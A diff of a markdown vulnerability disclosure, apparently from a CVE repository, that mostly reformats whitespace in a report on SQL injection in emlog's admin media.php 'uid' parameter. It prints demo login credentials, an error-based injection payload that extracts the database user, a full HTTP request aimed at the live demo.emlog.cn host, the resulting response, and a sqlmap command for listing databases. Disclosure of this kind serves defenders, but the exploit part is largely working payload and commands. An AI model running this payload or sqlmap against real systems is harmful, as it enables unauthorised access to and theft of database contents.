@@ -7,17 +7,17 @@
 
 ## Application Demo and credentials
 
-- URL
-https://demo.emlog.cn/admin/account.php?action=signin
-username:emlog
-password:emlogpro
+- URL   
+https://demo.emlog.cn/admin/account.php?action=signin   
+username:emlog   
+password:emlogpro   
 
 ## Technical Details & Exploit:
-- parameter
-  uid
-- payload
-  uid=1+AND+GTID_SUBSET(CONCAT(0x7E,(SELECT+(ELT(2908=2908,user()))),0x7E),2908)
-- Request message：
+- parameter   
+  uid   
+- payload   
+  `uid=1+AND+GTID_SUBSET(CONCAT(0x7E,(SELECT+(ELT(2908=2908,user()))),0x7E),2908)`
+- Request message：   
 ```
 GET /admin/media.php?uid=1+AND+GTID_SUBSET(CONCAT(0x7E,(SELECT+(ELT(2908=2908,user()))),0x7E),2908) HTTP/2
 Host: demo.emlog.cn
@@ -35,13 +35,14 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
 Te: trailers
 ```
-- Server response
-  we got the current_user : `demo_emlog_cn@localhost`
+- Server response   
+  we got the current_user :
+  `demo_emlog_cn@localhost`
 <img width="1035" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/30382685-36cf-4ada-9ae4-bb1eb4f70c2f">
-  We can also directly use the sqlmap tool to obtain database data：   
-  `python3 sqlmap.py -r 1.txt --dbs --batch`
+  We can also directly use the sqlmap tool to obtain database data：      
+  `python3 sqlmap.py -r 1.txt --dbs --batch`    
   <img width="993" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/ee892f8e-6079-4d4c-95f9-58d15ce3f513">
-- location on web application
+- location on web application   
   <img width="1282" alt="image" src="https://github.com/fubxx/CVE/assets/135971045/057a206e-e732-4a3c-9d5f-a3cfea2dd2f2">
   
 ## Impact:
